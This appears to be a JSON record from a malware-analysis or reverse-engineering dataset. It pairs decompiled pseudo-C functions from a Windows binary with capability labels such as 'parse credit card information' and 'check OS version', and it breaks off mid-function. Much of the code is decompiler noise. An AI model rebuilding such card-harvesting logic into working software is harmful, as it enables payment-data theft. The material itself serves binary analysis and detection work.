{
    "00401000": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00401034)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.00401000(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    // [00] -r-x section size 20480 named .text\n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h != 0) {\n        if (arg_8h <= pcVar2) {\n            do {\n                if (*arg_8h == *arg_10h) {\n                    bVar5 = true;\n                    iVar1 = arg_14h;\n                    pcVar3 = arg_8h;\n                    pcVar4 = arg_10h;\n                    do {\n                        pcVar4 = pcVar4 + 1;\n                        pcVar3 = pcVar3 + 1;\n                        iVar1 = iVar1 + -1;\n                        if (iVar1 == 0) break;\n                        bVar5 = *pcVar3 == *pcVar4;\n                    } while (bVar5);\n                    if (bVar5) {\n                        return arg_8h;\n                    }\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar2);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 367
    },
    "004023c0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004023c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    var_4h = fcn.00401000(arg_18h, arg_1ch, 0x411088, 7);\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    if (var_4h == NULL) {\n        return 0;\n    }\n    var_24h = 0;\n    puVar5 = &var_23h;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    uVar4 = 0;\n    do {\n        uVar2 = (*pcVar1)();\n        (&var_24h)[uVar4] = uVar2;\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 0x20);\n    puVar5 = &var_24h;\n    puVar6 = var_4h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    fcn.00404940(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n    fcn.004036e0(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 490
    },
    "004025d0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402aea) overlaps instruction at (ram,0x00402ae6)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.004025d0(void)\n\n{\n    uint32_t *puVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint16_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t *piVar8;\n    uint8_t extraout_AH;\n    uint uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    int16_t extraout_CX;\n    char extraout_CH;\n    ushort extraout_CX_00;\n    uint32_t extraout_ECX;\n    int32_t *extraout_ECX_00;\n    uint8_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    ushort extraout_DX;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint32_t extraout_EDX_01;\n    uint32_t unaff_EBX;\n    uint *unaff_EBP;\n    uint32_t unaff_ESI;\n    uint *puVar13;\n    uint *unaff_EDI;\n    uint8_t uVar14;\n    bool bVar15;\n    uchar uVar16;\n    uchar uVar17;\n    char cVar18;\n    uint8_t in_IF;\n    bool bVar19;\n    char cVar20;\n    ulong uVar21;\n    ushort uVar22;\n    uchar uVar23;\n    uchar uVar24;\n    ushort uVar25;\n    uchar uVar26;\n    uint16_t uVar27;\n    uchar uVar28;\n    uchar uVar29;\n    uint8_t uVar30;\n    uint8_t *arg_14h;\n    \n    bVar19 = false;\n    fcn.00404b30(0x411030, 0xd, 0x411058, 10);\n    fcn.00404b30(0x411030, 0xd, 0x411064, 0x12);\n    fcn.00404b30(0x411030, 0xd, 0x411078, 4);\n    fcn.00404b30(0x411030, 0xd, 0x41107c, 0xc);\n    fcn.00404b30(0x411030, 0xd, 0x411088, 7);\n    fcn.00404b30(0x411030, 0xd, 0x411090, 0xb);\n    uVar14 = 0;\n    bVar15 = (extraout_CX - 1U & unaff_EDI | 0x61be) == 0;\n    fcn.00404b30(0x411030, 0xd, 0x41109c, 0xc);\n    if ((!bVar15) && (bVar15)) {\n        bVar19 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        uVar14 = (uVar14 & 1) != 0;\n    }\n    uVar9 = fcn.00404b30(0x411030, 0xd, 0x4110a8, 8);\n    if ((!uVar14) && (uVar14)) {\n        out(0xbd, uVar9);\n        return uVar9;\n    }\n    uVar25 = 0x10b0;\n    uVar17 = 0x41;\n    uVar26 = 0;\n    fcn.00404b30(0x411030, 0xd, 0x4110b0, 0xd);\n    fcn.00404b30(0x411030, 0xd, 0x4110c0, 0x18);\n    fcn.00404b30(0x411030, 0xd, 0x4110d8, 0x25);\n    uVar28 = unaff_EBP >> 0x18;\n    uVar14 = unaff_ESI >> 0x18;\n    uVar9 = CONCAT31(unaff_EBP, uVar14);\n    puVar13 = unaff_ESI & 0xffffff | uVar14 << 0x18;\n    fcn.00404b30(0x411030, 0xd, 0x411100, 10);\n    fcn.00404b30(0x411030, 0xd, 0x41110c, 0xc);\n    fcn.00404b30(0x411030, 0xd, 0x411118, 0xd);\n    fcn.00404b30(0x411030, 0xd, 0x411128, 6);\n    uVar5 = unaff_EBX;\n    uVar14 = 0;\n    cVar20 = false;\n    cVar18 = '\\0';\n    uVar16 = ((uVar5 & 0xff00 | unaff_EBX | extraout_AH) & 0x94f) == 0;\n    iVar10 = fcn.00404b30(0x411030, 0xd, 0x411130, 5);\n    if (cVar20) {\ncode_r0x00402871:\n        uVar22 = 0xd;\n        uVar29 = 0;\n        uVar30 = 0;\n        uVar9 = 0x41113800;\n        uVar28 = 0;\n    }\n    else {\n        uVar22 = extraout_ECX;\n        uVar29 = extraout_ECX >> 0x10;\n        uVar30 = extraout_ECX >> 0x18;\n        piVar8 = extraout_ECX & 0xffffff | uVar30 << 0x18;\n        if (!cVar20) goto code_r0x00402871;\n        *unaff_EDI = *puVar13;\n        iVar4 = *piVar8 + iVar10 + 1;\n        cVar20 = SCARRY4(*piVar8, iVar10 + 1) != SCARRY4(iVar4, uVar14);\n        *piVar8 = iVar4 + uVar14;\n        cVar18 = *piVar8 < 0;\n        uVar16 = *piVar8 == 0;\n        puVar13 = puVar13 + bVar19 * -2 + 1;\n        unaff_EDI = unaff_EDI + bVar19 * -2 + 1;\n    }\n    fcn.00404b30(0x411030, 0xd, CONCAT13(uVar28, uVar9 >> 8), CONCAT13(uVar30, CONCAT12(uVar29, uVar22)));\n    if (cVar20 == cVar18) {\n        uVar28 = unaff_EBX >> 0x10;\n        uVar29 = unaff_EBX >> 0x18;\n        if (cVar20 == cVar18) goto code_r0x0040288f;\n        cVar20 = SCARRY4(*extraout_ECX_00, extraout_EDX) !=\n                 SCARRY4(*extraout_ECX_00 + extraout_EDX, extraout_EDX < 0x4868196a);\n        *extraout_ECX_00 = *extraout_ECX_00 + extraout_EDX + (extraout_EDX < 0x4868196a);\n        cVar18 = *extraout_ECX_00 < 0;\n        uVar16 = *extraout_ECX_00 == 0;\n        uVar27 = uVar5;\n    }\n    else {\ncode_r0x0040288f:\n        uVar27 = 0x19;\n        uVar28 = 0;\n        uVar29 = 0;\n        uVar25 = 0x1148;\n        uVar17 = 0x41;\n        uVar26 = 0;\n    }\n    uVar22 = 0x28a2;\n    uVar23 = 0x40;\n    uVar24 = 0;\n    fcn.00404b30(0x411030, 0xd, CONCAT13(uVar26, CONCAT12(uVar17, uVar25)), CONCAT13(uVar29, CONCAT12(uVar28, uVar27)));\n    if ((uVar16 || cVar20 != cVar18) || (!uVar16 && cVar20 == cVar18)) {\n        uVar22 = 0xf;\n        uVar23 = 0;\n        uVar24 = 0;\n    }\n    fcn.00404b30(0x411030, 0xd, 0x411164, CONCAT13(uVar24, CONCAT12(uVar23, uVar22)));\n    uVar11 = fcn.00404b30(0x411030, 0xd, 0x411174, 0xe);\n    uVar14 = uVar11 < 0x6e32;\n    uVar16 = uVar11 == 0x6e32;\n    uVar6 = unaff_EBX & 0xffff0000;\n    uVar7 = uVar5 & 0xff | (unaff_EBX >> 8) << 8;\n    uVar11 = uVar6 | uVar7;\n    fcn.00404b30(0x411030, 0xd, 0x411184, 0xb);\n    if ((!uVar16) && (uVar16)) {\n        uVar16 = ((uVar16 & 1) * '@' & 0x40) != 0;\n        uVar14 = (uVar14 & 1) != 0;\n    }\n    uVar22 = 0xb;\n    uVar29 = 0;\n    uVar28 = 0;\n    uVar9 = 0x41119000;\n    uVar25 = 0x1030;\n    uVar17 = 0x41;\n    uVar26 = 0;\n    fcn.00404b30(0x411030, 0xd, 0x411190, 0xb);\n    if ((!uVar14 && !uVar16) && (uVar14 || uVar16)) {\n        puVar13 = CONCAT13(uVar26, CONCAT12(uVar17, uVar25));\n    }\n    uVar16 = 0x9c;\n    uVar25 = 0x4111;\n    uVar17 = 0;\n    fcn.00404b30(0x411030, 0xd, 0x41119c, 0xb);\n    fcn.00404b30(0x411030, 0xd, 0x4111a8, 10);\n    bVar15 = false;\n    fcn.00404b30(0x411030, 0xd, 0x4111b4, 0xc);\n    if ((bVar15) || (arg_14h = extraout_ECX_01,  !bVar15)) {\n        arg_14h = 0xe;\n        uVar28 = 0xc0;\n        uVar22 = 0x4111;\n        uVar29 = 0;\n        uVar9 = 0xd;\n    }\n    puVar1 = extraout_EDX_00 + 0xe;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 - 0x68;\n    *extraout_ECX_01 = *extraout_ECX_01 << 1 | uVar3 < 0x68;\n    pcVar2 = extraout_EDX_00 + 0xd;\n    cVar18 = extraout_ECX_01 >> 8;\n    cVar20 = SCARRY1(*pcVar2, cVar18);\n    *pcVar2 = *pcVar2 + cVar18;\n    cVar18 = *pcVar2 < '\\0';\n    fcn.00404b30(0x411030, uVar9, CONCAT13(uVar29, CONCAT21(uVar22, uVar28)), arg_14h);\n    if (cVar20 == cVar18) {\n        uVar26 = uVar5 & 0xff;\n        uVar22 = uVar11 >> 8;\n        uVar28 = uVar6 >> 0x18;\n        if (cVar20 != cVar18) {\n            *extraout_ECX_02 = *extraout_ECX_02 + extraout_EDX_01 + (extraout_EDX_01 < 0xd068116a);\n            goto code_r0x00402a06;\n        }\n    }\n    uVar26 = 0x11;\n    uVar22 = 0;\n    uVar28 = 0;\n    uVar16 = 0xd0;\n    uVar25 = 0x4111;\n    uVar17 = 0;\ncode_r0x00402a06:\n    fcn.00404b30(0x411030, 0xd, CONCAT13(uVar17, CONCAT21(uVar25, uVar16)), CONCAT13(uVar28, CONCAT21(uVar22, uVar26)));\n    fcn.00404b30(0x411030, 0xd, 0x4111e4, 0x13);\n    fcn.00404b30(0x411030, 0xd, 0x4111f8, 0x14);\n    uVar14 = extraout_DX >> 8;\n    uVar16 = CARRY1(extraout_DX, uVar14);\n    cVar18 = extraout_DX + uVar14;\n    uVar17 = cVar18 == '\\0';\n    bVar15 = (POPCOUNT(cVar18) & 1U) == 0;\n    fcn.00404b30(0x411030, 0xd, 0x41120c, 0x33);\n    if ((!bVar15) && (bVar15)) {\n        puVar13 = &stack0xffffffe3;\n        cVar18 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar13 = puVar13 + -1;\n            *puVar13 = *unaff_EBP;\n            cVar18 = cVar18 + -1;\n        } while ('\\0' < cVar18);\n        uVar9 = in(0x78);\n        return uVar9;\n    }\n    uVar26 = 0x30;\n    uVar25 = 0x4110;\n    uVar28 = 0;\n    fcn.00404b30(0x411030, 0xd, 0x411240, 10);\n    if ((!uVar16 && !uVar17) && (uVar16 || uVar17)) {\n        puVar13 = CONCAT13(uVar28, CONCAT21(uVar25, uVar26));\n        uVar17 = *0x10 == 0x26;\n    }\n    uVar21 = fcn.00404b30(0x411030, 0xd, 0x41124c, 4);\n    puVar12 = uVar21;\n    if (!uVar16 && !uVar17) {\n        uVar11 = uVar6 | uVar7 & 0xffff00ff;\n    }\n    *unaff_EDI = *puVar13;\n    pcVar2 = (uVar21 >> 0x20) + 0xd;\n    *pcVar2 = *pcVar2 + extraout_CH;\n    puVar12[-1] = 0x411030;\n    puVar12[-2] = 0x402afd;\n    fcn.00404b30(puVar12[-1], *puVar12, puVar12[1], puVar12[2]);\n    puVar12[0xe] = uVar11 & 0xffff0000 | CONCAT11(0xdf, uVar11);\n    *(puVar12 + 0x36) = extraout_CX_00;\n    puVar12[0xe] = 6;\n    puVar12[0xd] = 0x411258;\n    puVar12[0xc] = 0xd;\n    puVar12[0xb] = 0x411030;\n    puVar12[10] = 0x402b28;\n    uVar9 = fcn.00404b30(puVar12[0xb], puVar12[0xc], puVar12[0xd], puVar12[0xe]);\n    puVar12[0xe] = uVar9;\n    puVar12[0xe] = 0x2a;\n    puVar12[0xd] = 0x41128c;\n    puVar12[0xc] = 0xd;\n    puVar12[0xb] = 0x411030;\n    puVar12[10] = 0x402b56;\n    uVar9 = fcn.00404b30(puVar12[0xb], puVar12[0xc], puVar12[0xd], puVar12[0xe]);\n    puVar12[0xe] = uVar9;\n    puVar12[0xe] = 0xb;\n    puVar12[0xd] = 0x4112b8;\n    puVar12[0xc] = 0xd;\n    puVar12[0xb] = 0x411030;\n    puVar12[10] = 0x402b81;\n    uVar9 = fcn.00404b30(puVar12[0xb], puVar12[0xc], puVar12[0xd], puVar12[0xe]);\n    return uVar9;\n}\n",
        "token_count": 3937
    },
    "00402b90": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ec2) overlaps instruction at (ram,0x00402ebe)\n// \n// WARNING: Control flow encountered bad instruction data\n\nuint __fastcall fcn.00402b90(uint param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    char extraout_CL;\n    char extraout_CL_00;\n    uint8_t extraout_CL_01;\n    ushort extraout_CX;\n    uint32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint32_t *extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    ushort extraout_DX;\n    char extraout_DH;\n    int32_t extraout_EDX;\n    uint8_t *unaff_EBX;\n    uint *puVar6;\n    uint unaff_EBP;\n    uint *puVar7;\n    uint *puVar8;\n    int32_t unaff_ESI;\n    int32_t *piVar9;\n    uint8_t *unaff_EDI;\n    int32_t *piVar10;\n    uchar uVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    bool bVar13;\n    char cVar14;\n    uchar uVar15;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar16;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    unkbyte10 in_ST0;\n    float10 fVar17;\n    ulong uVar18;\n    uchar auStack24192 [24043];\n    uchar *puStack149;\n    uint uStack88;\n    uint uVar19;\n    uint arg_14h;\n    uchar in_stack_ffffffc0;\n    ushort in_stack_ffffffc1;\n    uint in_stack_ffffffc3;\n    uchar in_stack_ffffffc7;\n    uint32_t uVar20;\n    ushort uVar21;\n    uint16_t uVar22;\n    uint8_t uVar23;\n    ushort uVar24;\n    uchar uVar25;\n    uchar uVar26;\n    ushort uVar27;\n    ushort uVar28;\n    \n    *(in_EAX + -0x7ce92414) = in_ST0;\n    uVar23 = 9 < (in_EAX - 1U & 0xf) | in_AF;\n    *param_2 = *param_2 + 0x116adf84;\n    fcn.00404b30(0x411030, 0xd, 0x411044, unaff_EBX);\n    fcn.00404b30(0x411030, 0xd, 0x411260, 0xf);\n    fcn.00404b30(0x411030, 0xd, 0x411270, 0x1a);\n    uVar21 = unaff_EBP;\n    uVar11 = unaff_EBP >> 0x10;\n    uVar15 = unaff_EBP >> 0x18;\n    fcn.00404b30(0x411030, 0xd, 0x4112c4, 10);\n    cVar16 = SBORROW1(extraout_CL, '\\x01');\n    cVar14 = extraout_CL + -1 < '\\0';\n    bVar12 = extraout_CL == '\\x01';\n    uVar24 = 0x2c66;\n    uVar25 = 0x40;\n    uVar26 = 0;\n    iVar3 = fcn.00404b30(0x411030, 0xd, 0x4112d0, 0xb);\n    if ((bVar12 || cVar16 != cVar14) || (!bVar12 && cVar16 == cVar14)) {\n        uVar24 = 8;\n        uVar25 = 0;\n        uVar26 = 0;\n        uVar21 = 0x12dc;\n        uVar11 = 0x41;\n        uVar15 = 0;\n    }\n    else {\n        unaff_EBX = unaff_EBX + 1;\n        *(iVar3 + 0x6a39da56) = *(iVar3 + 0x6a39da56) ^ extraout_CX;\n        *(iVar3 + -0x24) = *(iVar3 + -0x24) | extraout_CX >> 8;\n    }\n    fcn.00404b30(0x411030, 0xd, CONCAT13(uVar15, CONCAT12(uVar11, uVar21)), CONCAT13(uVar26, CONCAT12(uVar25, uVar24)));\n    fcn.00404b30(0x411030, 0xd, 0x4112e4, 9);\n    uVar27 = 0x12f0;\n    uVar28 = 0x41;\n    uVar21 = 0xd;\n    uVar24 = 0;\n    uVar2 = fcn.00404b30(0x411030, 0xd, 0x4112f0, 9);\n    piVar10 = unaff_EDI + 1;\n    cVar14 = uVar2 - *unaff_EDI;\n    uVar22 = (in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar14 < '\\0') * 0x80 | (cVar14 == '\\0') * 0x40 | (uVar23 & 1) * 0x10 | ((POPCOUNT(cVar14) & 1U) == 0) * 4\n             | uVar2 < *unaff_EDI;\n    uVar23 = (in_ID & 1) * 0x200000 >> 0x10 | (in_VIP & 1) * 0x100000 >> 0x10 | (in_VIF & 1) * 0x80000 >> 0x10 |\n             (in_AC & 1) * 0x40000 >> 0x10;\n    uVar11 = 0;\n    piVar9 = unaff_ESI + -1;\n    uVar18 = func_0x10188c70();\n    bVar12 = (POPCOUNT(unaff_EBX[uVar18 + -0x7f] & 0x4b) & 1U) == 0;\n    puVar7 = (uVar18 >> 0x20) + 9;\n    uVar20 = CONCAT31(0x402d11, in_stack_ffffffc7);\n    fcn.00404b30(0x411030, 0xd, 0x4112fc, CONCAT13(uVar11, CONCAT12(uVar23, uVar22)));\n    uVar4 = extraout_ECX;\n    if (bVar12) {\ncode_r0x00402d1d:\n        uVar11 = 0;\n        uVar20 = 0xc00;\n        in_stack_ffffffc0 = 0xd;\n        in_stack_ffffffc1 = 0;\n        in_stack_ffffffc3 = 0x41130800;\n    }\n    else {\n        uVar20 = uVar20 & 0xff | extraout_ECX << 8;\n        uVar11 = extraout_ECX >> 0x18;\n        uVar4 = extraout_ECX & 0xffffff;\n        if (!bVar12) goto code_r0x00402d1d;\n    }\n    *(extraout_EDX + 0xc) = *(extraout_EDX + 0xc) + -0x68;\n    *unaff_EBX = *unaff_EBX | extraout_EDX;\n    puVar1 = extraout_EDX + 0xd;\n    uVar23 = uVar4 + 1 >> 8;\n    bVar12 = CARRY1(*puVar1, uVar23);\n    *puVar1 = *puVar1 + uVar23;\n    bVar13 = *puVar1 == 0;\n    fcn.00404b30(0x411030, CONCAT13(in_stack_ffffffc3, CONCAT21(in_stack_ffffffc1, in_stack_ffffffc0)), \n                 CONCAT13(uVar20, in_stack_ffffffc3 >> 8), CONCAT13(uVar11, uVar20 >> 8));\n    if ((!bVar12 && !bVar13) && (bVar12 || bVar13)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar19 = 3;\n    uStack88 = 0x402d4d;\n    fcn.00404b30(0x411030, 0xd, 0x411314, 3);\n    if (&stack0xffffffac < 0xffffffc0 && *0x10 != 0x14) {\n        if (&stack0xffffffac >= 0xffffffc0 || *0x10 == 0x14) {\n            *piVar10 = *piVar9;\n            unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n            puVar7 = 0x6ae181d0;\n            piVar9 = unaff_ESI + 3;\n            piVar10 = unaff_EDI + 5;\n            goto code_r0x00402d71;\n        }\n    }\n    uVar27 = 10;\n    uVar28 = 0;\n    uVar21 = 0x1318;\n    uVar24 = 0x41;\ncode_r0x00402d71:\n    fcn.00404b30(0x411030, 0xd, CONCAT22(uVar24, uVar21), CONCAT22(uVar28, uVar27));\n    bVar12 = false;\n    uVar21 = 0x2da8;\n    uVar11 = 0x40;\n    uVar15 = 0;\n    fcn.00404b30(0x411030, 0xd, 0x411324, 0x40);\n    if ((bVar12) || (!bVar12)) {\n        uVar21 = 0xc;\n        uVar11 = 0;\n        uVar15 = 0;\n    }\n    fcn.00404b30(0x411030, 0xd, 0x411364, CONCAT13(uVar15, CONCAT12(uVar11, uVar21)));\n    fcn.00404b30(0x411030, 0xd, 0x411370, 0xb);\n    iVar3 = fcn.00404b30(0x411030, 0xd, 0x41137c, 4);\n    iVar3 = extraout_ECX_00 - iVar3;\n    uVar22 = iVar3 & 0xff00 | iVar3 ^ iVar3 >> 8 | 0x3d00 | unaff_EBX;\n    uVar23 = uVar22;\n    uVar2 = uVar22 >> 8;\n    uVar11 = uVar2 < uVar23;\n    bVar12 = SBORROW1(uVar2, uVar23);\n    uVar15 = uVar2 - uVar23 < '\\0';\n    cVar16 = uVar2 == uVar23;\n    uVar21 = 0x1030;\n    uVar25 = 0x41;\n    uVar26 = 0;\n    cVar14 = fcn.00404b30(0x411030, 0xd, 0x411380, 4);\n    if ((bVar12) || (!bVar12)) {\n        uVar22 = 0xc;\n    }\n    else {\n        uVar15 = in(extraout_DX);\n        *piVar10 = uVar15;\n        if (!uVar11 && !cVar16) {\n            *(extraout_ECX_01 + 0x206a8d4b) = (*(extraout_ECX_01 + 0x206a8d4b) - cVar14) - uVar11;\n            fcn.00404b30(0x411030, 0xd, 0x4113c0, CONCAT13(uVar25, CONCAT21(uVar21, extraout_DX >> 8)));\n            fcn.00404b30(0x411030, 0xd, 0x4113e0, 0x26);\n            fcn.00404b30(0x411030, 0xd, 0x411408, 8);\n            fcn.00404b30(0x411030, 0xd, 0x411410, 0x19);\n            bVar12 = SBORROW1(extraout_DH, extraout_CL_00);\n            uVar11 = 0xdf;\n            uVar15 = 0x2f;\n            uVar21 = 0x40;\n            fcn.00404b30(0x411030, 0xd, 0x41142c, 0xb);\n            if ((bVar12) || (!bVar12)) {\n                uVar11 = 0x12;\n                uVar15 = 0;\n                uVar21 = 0;\n            }\n            fcn.00404b30(0x411030, 0xd, 0x411438, CONCAT22(uVar21, CONCAT11(uVar15, uVar11)));\n            fcn.00404b30(0x411030, 0xd, 0x41144c, 0x12);\n            fcn.00404b30(0x411030, 0xd, 0x411460, 2);\n            fcn.00404b30(0x411030, 0xd, 0x411464, 8);\n            bVar12 = (piVar9 & 0xffff0000 | piVar9 + 1) - 0x222c < 0;\n            fVar17 = fcn.00404b30(0x411030, 0xd, 0x41146c, 8);\n            if ((!bVar12) && (bVar12)) {\n                *(piVar10 + 0x1d) = fVar17;\n                piVar9 = piVar9 + 5;\n            }\n            uVar4 = fcn.00404b30(0x411030, 0xd, 0x411474, 6);\n            uVar11 = 0;\n            uVar4 = piVar9 & (uVar4 & 0xffff0000 | CONCAT11((uVar4 >> 8) + '\\x01', uVar4));\n            uVar15 = uVar4 == 0;\n            bVar12 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n            fcn.00404b30(0x411030, 0xd, 0x41147c, 7);\n            if (bVar12) goto code_r0x0040311e;\n            while( true ) {\n                if (bVar12) {\n                    puVar8 = &stack0xffffffcf;\n                    cVar14 = '\\x1e';\n                    do {\n                        puVar7 = puVar7 + -1;\n                        puVar8 = puVar8 + -1;\n                        *puVar8 = *puVar7;\n                        cVar14 = cVar14 + -1;\n                    } while ('\\0' < cVar14);\n                    uVar19 = in(0x78);\n                    return uVar19;\n                }\ncode_r0x0040311e:\n                puVar5 = fcn.00404b30(0x411030, 0xd, 0x411484, 7);\n                if ((uVar11) || (!uVar11)) break;\n                bVar12 = &stack0xffffffc3 < *puVar5;\n                if (bVar12 || puVar5 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                puVar1 = (unaff_EBX & 0xff000000 | CONCAT21(unaff_EBX >> 8, 0xbc)) + 0x66f68bdb;\n                uVar23 = extraout_CL_01 - *puVar1;\n                uVar11 = extraout_CL_01 < *puVar1 || uVar23 < bVar12;\n                cVar14 = uVar23 - bVar12;\n                uVar15 = cVar14 == '\\0';\n                bVar12 = (POPCOUNT(cVar14) & 1U) == 0;\n            }\n            fcn.00404b30(0x411030, 0xd, 0x41148c, 6);\n            puVar8 = puVar7;\n            if ((!uVar15) && (uVar15)) {\n                puStack149 = &stack0xffffffaf;\n                puVar6 = &stack0xffffffaf;\n                puVar8 = &stack0xffffffaf;\n                cVar14 = '\\x10';\n                do {\n                    puVar7 = puVar7 + -1;\n                    puVar6 = puVar6 + -1;\n                    *puVar6 = *puVar7;\n                    cVar14 = cVar14 + -1;\n                } while ('\\0' < cVar14);\n            }\n            fcn.00404b30(0x411030, 0xd, 0x411494, 0x25);\n            bVar12 = POPCOUNT(&stack0xffffa180 & 0xff) != '\\0';\n            if ((bVar12) && (!bVar12)) {\n                puVar7 = &stack0xffffa17c;\n                cVar14 = '\\x1e';\n                do {\n                    puVar8 = puVar8 + -1;\n                    puVar7 = puVar7 + -1;\n                    *puVar7 = *puVar8;\n                    cVar14 = cVar14 + -1;\n                } while ('\\0' < cVar14);\n                uVar19 = in(0x78);\n                return uVar19;\n            }\n            uVar19 = fcn.00404b30(0x411030, 0xd, 0x4114bc, 8);\n            return uVar19;\n        }\n        uVar22 = 0x56;\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*extraout_ECX_01, 0xbc);\n        uVar4 = uVar11;\n        uVar11 = 0x7b97f395 < *extraout_ECX_01 || CARRY4(*extraout_ECX_01 + 0x84680c6a, uVar4);\n        iVar3 = *extraout_ECX_01 + 0x84680c6a + uVar4;\n        uVar15 = iVar3 < 0;\n        cVar16 = iVar3 == 0;\n        piVar10 = piVar10 + 1;\n    }\n    uVar18 = fcn.00404b30(0x411030, 0xd, uVar22, CONCAT13(uVar26, CONCAT12(uVar25, uVar21)));\n    if ((!uVar15) && (uVar15)) {\n        piVar9 = uVar18 + -0x1bf31dd6;\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        puVar5 = (uVar18 >> 0x20) + 4;\n        uVar11 = *puVar5 < puVar7;\n        cVar16 = *puVar5 == puVar7;\n    }\n    while( true ) {\n        arg_14h = 0x402ea9;\n        fcn.00404b30(0x411030, 0xd, 0x411390, 0x411030);\n        if ((uVar11) || (!uVar11)) break;\n        if (extraout_ECX_02 == 1 || cVar16 == '\\0') {\n            *piVar10 = piVar9 + 1;\n            *(*0x9750e2b5 + -0x6c) = *(*0x9750e2b5 + -0x6c) | puVar7;\ncode_r0x00402ec9:\n            fcn.00404b30(0x411030, 0xd, uVar19, arg_14h);\n            fcn.00404b30(0x411030, 0xd, 0x4113a0, 0x16);\n            uVar19 = fcn.00404b30(0x411030, 0xd, 0x4113b8, 7);\n            return uVar19;\n        }\n    }\n    arg_14h = 9;\n    uVar19 = 0x411394;\n    goto code_r0x00402ec9;\n}\n",
        "token_count": 4700
    },
    "00402230": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402230(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n 